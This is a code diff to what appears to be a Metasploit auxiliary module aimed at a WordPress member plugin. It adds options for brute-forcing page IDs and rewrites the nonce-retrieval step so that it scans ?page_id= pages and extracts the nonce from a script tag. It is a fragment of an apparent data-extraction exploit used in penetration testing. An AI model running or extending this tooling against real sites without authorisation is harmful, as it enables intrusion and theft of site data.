@@ -45,26 +45,39 @@ class MetasploitModule < Msf::Auxiliary
     register_options [
       OptInt.new('COUNT', [false, 'Number of rows to retrieve', 1]),
       OptInt.new('DIR_ID_MIN', [true, 'Minimum value for bruteforcing directory IDs', 1]),
-      OptInt.new('DIR_ID_MAX', [true, 'Maximum value for bruteforcing directory IDs', 100])
+      OptInt.new('DIR_ID_MAX', [true, 'Maximum value for bruteforcing directory IDs', 100]),
+      OptInt.new('PAGE_ID_MIN', [true, 'Minimum page ID for bruteforcing registration pages', 1]),
+      OptInt.new('PAGE_ID_MAX', [true, 'Maximum page ID for bruteforcing registration pages', 20])
     ]
   end
 
   def get_nonce
-    print_status('Getting nonce...')
-    res = send_request_cgi({
-      'method' => 'GET',
-      'uri' => normalize_uri(target_uri.path, 'register')
-    })
-    fail_with(Failure::Unreachable, 'Connection failed') unless res
+    print_status('Attempting to locate the registration page and retrieve the nonce...')
 
-    nonce = res.body.scan(/"nonce":"([^"]+)"/).flatten.first
-    if nonce
-      print_good("Nonce retrieved: #{nonce}")
-    else
-      fail_with(Failure::UnexpectedReply, 'Failed to retrieve nonce')
+    uris_to_test = (datastore['PAGE_ID_MIN']..datastore['PAGE_ID_MAX']).map { |id| "?page_id=#{id}" }
+
+    uris_to_test.each do |uri|
+      res = send_request_cgi({
+        'method' => 'GET',
+        'uri' => normalize_uri(target_uri.path, uri)
+      })
+
+      next unless res&.code == 200
+
+      page = res.get_html_document
+
+      script_tag = page.at_xpath('//script[contains(text(), "um_scripts")]')
+      next unless script_tag
+
+      nonce = script_tag.text[/"nonce":"([^"]+)"/, 1]
+      if nonce
+        print_good("Nonce retrieved: #{nonce} using #{uri}")
+        return nonce
+      end
     end
 
-    nonce
+    print_error('Failed to retrieve nonce')
+    raise 'Failed to retrieve nonce'
   end
 
   def get_directory_id(nonce)
